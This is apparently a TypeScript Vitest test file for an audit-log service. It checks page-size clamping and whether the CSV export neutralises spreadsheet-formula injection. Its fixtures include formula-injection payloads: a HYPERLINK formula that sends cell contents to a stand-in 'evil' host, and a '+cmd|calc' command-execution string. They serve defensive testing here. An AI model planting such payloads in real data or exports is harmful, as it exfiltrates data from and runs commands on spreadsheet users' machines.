// @vitest-environment node

/**
 * The audit-log read surface over a recording fake of the postgres.js tag:
 * the page size that reaches `LIMIT` (every door pages through
 * `listAuditLogs`, so the clamp lives there) and the CSV export's
 * neutralisation of spreadsheet-formula cells — the export's reader is the
 * org's most privileged one, and titles and e-mails are member-authored.
 */

import type { Sql } from 'postgres';
import { describe, expect, it } from 'vitest';

import { buildAuditExport, listAuditLogs } from './service.ts';
import type { AuditLogRow } from './types.ts';

interface Statement {
  text: string;
  values: unknown[];
}

function fakeSql(rows: unknown[] = []): { sql: Sql; statements: Statement[] } {
  const statements: Statement[] = [];
  const tag = (strings: TemplateStringsArray, ...values: unknown[]) => {
    let text = '';
    const flat: unknown[] = [];
    strings.forEach((part, index) => {
      text += part;
      if (index >= values.length) return;
      const value = values[index];
      if (
        typeof value === 'object' &&
        value !== null &&
        'unsafeText' in value
      ) {
        text += String(value.unsafeText);
      } else {
        text += '?';
        flat.push(value);
      }
    });
    text = text.replace(/\s+/g, ' ').trim();
    statements.push({ text, values: flat });
    return Promise.resolve(rows);
  };
  tag.unsafe = (text: string) => ({ unsafeText: text });
  return { sql: tag as unknown as Sql, statements };
}

function limitOf(statements: Statement[]): unknown {
  const query = statements.find((s) => s.text.includes('FROM app.audit_logs'));
  return query?.values.at(-1);
}

describe('listAuditLogs — page size', () => {
  it.each([
    [-5, 2],
    [0, 2],
    [2.7, 3],
    [50, 51],
    [10_000, 201],
  ])(
    'clamps limit %s to a LIMIT of %s (page + 1 lookahead)',
    async (limit, expected) => {
      const fake = fakeSql();
      await listAuditLogs(fake.sql, 'org_1', { limit });
      expect(limitOf(fake.statements)).toBe(expected);
    },
  );

  it('defaults to 50', async () => {
    const fake = fakeSql();
    await listAuditLogs(fake.sql, 'org_1');
    expect(limitOf(fake.statements)).toBe(51);
  });
});

describe('buildAuditExport — CSV', () => {
  const row = (overrides: Partial<AuditLogRow>): AuditLogRow => ({
    id: 'a1',
    organizationId: 'org_1',
    actorId: 'u1',
    actorEmail: null,
    actorEmailHash: null,
    actorRole: null,
    actorType: 'user',
    action: 'document.rename',
    category: 'data',
    resourceType: 'document',
    resourceId: 'd1',
    resourceName: null,
    previousState: null,
    newState: null,
    changedFields: null,
    sessionId: null,
    ipAddress: null,
    actorIpHash: null,
    userAgent: null,
    requestId: null,
    timestamp: 0,
    status: 'success',
    errorMessage: null,
    metadata: null,
    integrityHash: 'h',
    previousHash: null,
    piiScrubbed: null,
    ...overrides,
  });

  it('neutralises formula prefixes in member-authored cells', async () => {
    const fake = fakeSql([
      row({
        resourceName: '=HYPERLINK("http://evil/"&A1,"x")',
        actorEmail: '+cmd|calc',
        errorMessage: '-1+1',
      }),
      row({ id: 'a2', resourceName: '@SUM(A1)' }),
      row({ id: 'a3', resourceName: '\tsneaky' }),
      row({ id: 'a4', resourceName: 'Quarterly report, final' }),
    ]);

    const built = await buildAuditExport(fake.sql, 'org_1', { format: 'csv' });
    const lines = built.content.split('\n');

    expect(lines[1]).toContain(`"'=HYPERLINK(""http://evil/""&A1,""x"")"`);
    expect(lines[1]).toContain(`'+cmd|calc`);
    expect(lines[1]).toContain(`'-1+1`);
    expect(lines[2]).toContain(`'@SUM(A1)`);
    expect(lines[3]).toContain(`'\tsneaky`);
    // Ordinary text is untouched — quoted only for the comma.
    expect(lines[4]).toContain('"Quarterly report, final"');
    expect(lines[4]).not.toContain("'Quarterly");
  });
});
